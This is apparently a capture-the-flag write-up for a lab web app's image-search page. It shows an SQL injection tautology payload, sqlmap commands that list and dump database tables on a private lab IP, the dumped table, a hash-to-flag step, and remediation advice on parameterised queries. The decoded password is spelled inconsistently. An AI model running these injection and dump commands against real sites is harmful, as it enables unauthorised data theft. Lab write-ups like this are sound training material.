VULNERABILTY__
 ```bash 
   => Search image tag, is vulnerable to sql injection.```


EXPLOIT_:
 ```bash 
    step1 ) => see if the sight reposnds to an SQL Injection
    nu typing  [ 1 or 1 = 1], in the search bar and then press Enter.

    step 2) => if the page returns information about an image,
        open terminal, copy the URL and paste in sqlmap
        like so,

        sqlmap -u "http://192.168.8.6/?page=searchimg&id=1+or+1+%3D+1&Submit=Submit#" --tables

        => this should return the schema's of the database.
        => then 

        sqlmap -u "http://192.168.8.6/?page=searchimg&id=1+or+1+%3D+1&Submit=Submit#" --dump -T list_images

        ^ should retune the table: ```
        
 ```bash       
+----+----------------------------------+-----------+-----------------------------------------------------------------------------------------------------------------------+
| id | url                              | title     | comment                                                                                                               |
+----+----------------------------------+-----------+-----------------------------------------------------------------------------------------------------------------------+
| 1  | https://www.nsa.org/img.jpg      | Nsa       | An image about the NSA !                                                                                              |
| 2  | https://www.42.fr/42.png         | 42 !      | There is a number..                                                                                                   |
| 3  | https://www.google.fr/google.png | Google    | Google it !                                                                                                           |
| 4  | https://www.obama.org/obama.jpg  | Obama     | Yes we can !                                                                                                          |
| 5  | borntosec.ddns.net/images.png    | Hack me ? | If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46 |
| 6  | https://www.h4x0r3.0rg/tr0ll.png | tr00l     | Because why not ?                                                                                                     |
+----+----------------------------------+-----------+-----------------------------------------------------------------------------------------------------------------------+
```

    => copy and paste " 1928e8083cf461a51303633093573c46" on  "https://www.md5online.org/md5-decrypt.html" to get
    a decoded string i.e "albatroz", then then type "abatroz" in "https://passwordsgenerator.net/sha256-hash-generator/"
    to get the Flag "5F894D1824AFA90D623FA370A9DA97603427A2902F97C280D93D6561F7FB373B"

```bash
 1928e8083cf461a51303633093573c46 => albaroz => 5F894D1824AFA90D623FA370A9DA97603427A2902F97C280D93D6561F7FB373B
 ```

SOLUTION:
```bash
    Use SQL Parameters (parametized Queries)
     for Protection e.g txtNam = getRequestString("CustomerName");
                        txtAdd = getRequestString("Address");
                        txtCit = getRequestString("City");
                        txtSQL = "INSERT INTO Customers (CustomerName,Address,City) Values(@0,@1,@2)";
                        db.Execute(txtSQL,txtNam,txtAdd,txtCit);
                        ```

    => use prepared statements  and  stored procedure                              
  
